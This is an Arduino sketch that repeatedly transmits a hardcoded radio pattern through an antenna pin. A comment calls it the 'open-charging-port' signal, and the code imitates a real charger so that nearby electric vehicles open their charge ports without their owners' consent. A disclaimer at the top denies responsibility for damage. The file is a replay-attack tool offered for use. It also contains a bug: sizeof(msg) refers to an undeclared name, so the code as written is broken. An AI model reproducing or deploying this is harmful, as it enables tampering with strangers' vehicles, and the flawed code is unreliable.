/*
    Author: Elia Karrer
    Date:   09-02-2022
    
    DISCLAIMER:
    I am not responsible for any damage, which is done, using this code.
    
    LICENSE: MIT
    More info: github.com/Elia-Karrer
*/

#include <Arduino.h>
#define ANTENNA_PORT 11

const unsigned char* pattern = "\xaa\xaa\xaa\x8a\xcb\x32\xcc\xcc\xcb\x4d\x2d\x4a\xd3\x4c"
                               "\xab\x4b\x15\x96\x65\x99\x99\x96\x9a\x5a\x95\xa6\x99\x56"
                               "\x96\x2b\x2c\xcb\x33\x33\x2d\x34\xb5\x2b\x4d\x32\xad\x28";

void send_open_signal(uint8_t);
void send_message(uint8_t, unsigned char*, uint32_t, uint32_t);


void setup(void)
{
    pinMode(ANTENNA_PORT, OUTPUT);
}


void loop(void)
{ 
    // Sends the "open-charging-port" signal every 3 seconds
    send_open_signal(ANTENNA_PORT);
    delay(3000);
}


/*
    WARNING:
    To act like a real charger,
    don't modify bps or delay values!
*/

void send_open_signal(uint8_t port)
{
    uint8_t i;

    // Send message 5 times
    for(i = 0; i < 5; i++)
    {
        send_message(port, pattern, sizeof(msg), 2500);
        
        // Delay between repetitions
        delay(23);
    }
}


/*
    port:    Destination port to send message
    msg:     The message as byte-array
    len:     Length of message in bytes
    bps:     bits per second to send message
*/

void send_message(uint8_t port, unsigned char* msg, uint32_t len, uint32_t bps)
{    
    uint32_t i;
    uint8_t j;

    // Calculate pulse width in microseconds
    const uint32_t pulse_width = 1000000 / bps;
    
    // Iterate over message bytewise
    for(i = 0; i < len; i++)
    {
        // Send current byte
        for(j = 0; j < 8; j++)
        {
            digitalWrite(port, (*msg) & (128 >> j));
            delayMicroseconds(pulse_width);
        }

        // Forward to next byte
        msg++;
    }

    // Turn off again
    digitalWrite(port, 0);
}
